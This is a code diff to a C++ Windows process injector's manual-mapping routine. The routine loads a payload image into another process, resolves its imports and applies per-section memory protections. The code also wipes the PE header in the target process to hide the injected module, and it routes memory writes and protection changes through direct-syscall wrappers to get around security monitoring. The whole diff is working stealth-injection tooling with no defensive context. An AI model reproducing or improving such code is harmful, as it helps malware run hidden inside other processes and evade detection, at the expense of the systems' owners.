@@ -78,15 +78,23 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
                 PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(pLocalBase + pImportDesc->FirstThunk);
                 PIMAGE_THUNK_DATA pOriginalThunk = (PIMAGE_THUNK_DATA)(pLocalBase + (pImportDesc->OriginalFirstThunk ? pImportDesc->OriginalFirstThunk : pImportDesc->FirstThunk));
                 while (pThunk->u1.AddressOfData != 0) {
+                    FARPROC pFunc = NULL;
                     if (IMAGE_SNAP_BY_ORDINAL(pOriginalThunk->u1.Ordinal)) {
-                        pThunk->u1.Function = (DWORD_PTR)GetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(pOriginalThunk->u1.Ordinal));
+                        pFunc = GetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(pOriginalThunk->u1.Ordinal));
                     } else {
                         PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)(pLocalBase + pOriginalThunk->u1.AddressOfData);
-                        pThunk->u1.Function = (DWORD_PTR)GetProcAddress(hDll, (LPCSTR)pImportByName->Name);
+                        pFunc = GetProcAddress(hDll, (LPCSTR)pImportByName->Name);
+                    }
+                    if (pFunc) {
+                        pThunk->u1.Function = (DWORD_PTR)pFunc;
+                    } else {
+                        LOG_ERR("MapAndInject: Failed to resolve import.");
                     }
                     pThunk++;
                     pOriginalThunk++;
                 }
+            } else {
+                LOG_ERR("MapAndInject: Failed to load DLL: " + std::string(szDllName));
             }
             pImportDesc++;
         }
@@ -102,13 +110,27 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
     std::vector<uint8_t> zeroHeader(pNtHeaders->OptionalHeader.SizeOfHeaders, 0);
     SysNtWriteVirtualMemory(hProcess, pTargetBase, zeroHeader.data(), zeroHeader.size(), NULL);
 
-    // 5. Change protection to RX
-    DWORD oldProt;
-    PVOID pProtBase = pTargetBase;
-    SIZE_T protSize = pNtHeaders->OptionalHeader.SizeOfImage;
-    if (!NT_SUCCESS(SysNtProtectVirtualMemory(hProcess, &pProtBase, &protSize, PAGE_EXECUTE_READ, &oldProt))) {
-        LOG_ERR("MapAndInject: NtProtectVirtualMemory fail.");
-        return false;
+    // 5. Section Protections
+    PIMAGE_SECTION_HEADER pSect = IMAGE_FIRST_SECTION(pNtHeaders);
+    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
+        PVOID pSectionAddr = (PVOID)((PBYTE)pTargetBase + pSect[i].VirtualAddress);
+        SIZE_T sSize = pSect[i].Misc.VirtualSize;
+        DWORD flProtect = 0;
+
+        if (pSect[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
+            flProtect = PAGE_READWRITE;
+        } else if (pSect[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
+            flProtect = (pSect[i].Characteristics & IMAGE_SCN_MEM_READ) ? PAGE_EXECUTE_READ : PAGE_EXECUTE;
+        } else if (pSect[i].Characteristics & IMAGE_SCN_MEM_READ) {
+            flProtect = PAGE_READONLY;
+        } else {
+            flProtect = PAGE_NOACCESS;
+        }
+
+        if (pSect[i].Characteristics & IMAGE_SCN_MEM_NOT_CACHED) flProtect |= PAGE_NOCACHE;
+
+        DWORD oldP;
+        SysNtProtectVirtualMemory(hProcess, &pSectionAddr, &sSize, flProtect, &oldP);
     }
 
     if (ppRemoteBase) *ppRemoteBase = pTargetBase;
